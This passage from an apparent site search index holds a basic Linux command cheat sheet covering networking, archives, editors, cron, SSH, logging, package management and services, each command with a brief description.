-tuln</code> -&gt; shows active connections and listening ports (deprecated)</li> <li><code>$ ss -tuln</code> -&gt; shows active connections and listening ports (modern)</li> <li><code>$ curl &lt;url&gt;</code> -&gt; fetches and displays contents from <code>&lt;url&gt;</code></li> <li><code>$ wget &lt;url&gt;</code> -&gt; downloads file(s) from <code>&lt;url&gt;</code></li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#11-archives-and-compression","title":"11 - Archives and Compression","text":"<ul> <li><code>$ tar -cvf &lt;archive.tar&gt; &lt;files&gt;</code> -&gt; create tar archive</li> <li><code>$ tar -xvf &lt;archive.tar&gt;</code> -&gt; extract tar archive</li> <li><code>$ tar -czvf &lt;archive.tar.gz&gt; &lt;files&gt;</code> -&gt; create compressed tar.gz archive</li> <li><code>$ tar -xzvf &lt;archive.tar.gz&gt;</code> -&gt; extract tar.gz archive</li> <li><code>$ gzip &lt;file&gt;</code> -&gt; compress file into .gz</li> <li><code>$ gunzip &lt;file.gz&gt;</code> -&gt; decompress .gz file</li> <li><code>$ zip &lt;archive.zip&gt; &lt;files&gt;</code> -&gt; create zip archive</li> <li><code>$ unzip &lt;archive.zip&gt;</code> -&gt; extract zip archive</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#12-editors","title":"12 - Editors","text":"<ul> <li><code>$ nano &lt;file&gt;</code> -&gt; open file in nano editor</li> <li><code>$ vim &lt;file&gt;</code> -&gt; open file in vim editor</li> <li><code>$ gedit &lt;file&gt;</code> -&gt; open file in gedit GUI editor</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#13-scripting-basics","title":"13 - Scripting Basics","text":"<ul> <li><code>#!/bin/bash</code> -&gt; shebang to define shell for script</li> <li><code>$ nano &lt;script.sh&gt;</code> -&gt; create/edit script file</li> <li><code>$ chmod +x &lt;script.sh&gt;</code> -&gt; make script executable</li> <li><code>$ ./&lt;script.sh&gt;</code> -&gt; run script</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#14-environment-variables","title":"14 - Environment Variables","text":"<ul> <li><code>$ echo $PATH</code> -&gt; prints PATH variable</li> <li><code>$ export &lt;VAR&gt;=&lt;value&gt;</code> -&gt; sets environment variable for session</li> <li><code>$ echo $VAR</code> -&gt; prints value of variable</li> <li><code>$ nano ~/.bashrc</code> -&gt; edit bashrc to make variables permanent</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#15-symbolic-links","title":"15 - Symbolic Links","text":"<ul> <li><code>$ ln -s &lt;target&gt; &lt;link&gt;</code> -&gt; create symbolic link to target</li> <li><code>$ ls -l</code> -&gt; shows symlinks and their targets</li> <li><code>$ cat &lt;symlink&gt;</code> -&gt; follows symlink and prints target contents</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#16-package-management","title":"16 - Package Management","text":"<ul> <li><code>$ sudo apt update</code> -&gt; update package list</li> <li><code>$ sudo apt upgrade</code> -&gt; upgrade installed packages</li> <li><code>$ sudo apt install &lt;pkg&gt;</code> -&gt; install package</li> <li><code>$ sudo apt remove &lt;pkg&gt;</code> -&gt; remove package</li> <li><code>$ dpkg -i &lt;file.deb&gt;</code> -&gt; install from local .deb file</li> <li><code>$ apt-cache search &lt;term&gt;</code> -&gt; search package repositories</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#17-logging","title":"17 - Logging","text":"<ul> <li><code>/var/log/</code> -&gt; main system log directory</li> <li><code>$ cat /var/log/auth.log</code> -&gt; view authentication logs</li> <li><code>$ tail -f /var/log/syslog</code> -&gt; follow system log in real time</li> <li><code>$ dmesg</code> -&gt; view kernel messages</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#18-redirection-pipes","title":"18 - Redirection &amp; Pipes","text":"<ul> <li><code>&gt; &lt;file&gt;</code> -&gt; overwrite file with command output</li> <li><code>&gt;&gt; &lt;file&gt;</code> -&gt; append command output to file</li> <li><code>&lt; &lt;file&gt;</code> -&gt; use file as input to command</li> <li><code>&lt;cmd1&gt; | &lt;cmd2&gt;</code> -&gt; pipe output of cmd1 into cmd2</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#19-wildcards-globbing","title":"19 - Wildcards &amp; Globbing","text":"<ul> <li><code>*</code> -&gt; matches zero or more characters</li> <li><code>?</code> -&gt; matches exactly one character</li> <li><code>[abc]</code> -&gt; matches one character in set</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#20-cron-jobs","title":"20 - Cron Jobs","text":"<ul> <li><code>$ crontab -l</code> -&gt; list cron jobs</li> <li><code>$ crontab -e</code> -&gt; edit cron jobs</li> <li><code>0 0 * * * &lt;cmd&gt;</code> -&gt; run command every day at midnight</li> <li><code>$ systemctl status cron</code> -&gt; check cron service</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#21-ssh-basics","title":"21 - SSH Basics","text":"<ul> <li><code>$ ssh user@host</code> -&gt; connect to host as user</li> <li><code>$ ssh -p &lt;port&gt; user@host</code> -&gt; connect with custom port</li> <li><code>$ ssh -i &lt;key&gt; user@host</code> -&gt; connect with SSH key</li> <li><code>$ scp &lt;file&gt; user@host:/path&gt;</code> -&gt; copy file to remote host</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#22-services","title":"22 - Services","text":"<ul> <li><code>$ systemctl status &lt;service&gt;</code> -&gt; check service status</li> <li><code>$ systemctl start &lt;service&gt;</code> -&gt; start service</li> <li><code>$ systemctl stop &lt;service&gt;</code> -&gt; stop service</li> <li><code>$ systemctl enable &lt;service&gt;</code> -&gt; enable service at boot</li> <li><code>$ service &lt;service&gt; restart</code> -&gt; restart service (legacy)</li> </ul>"}]}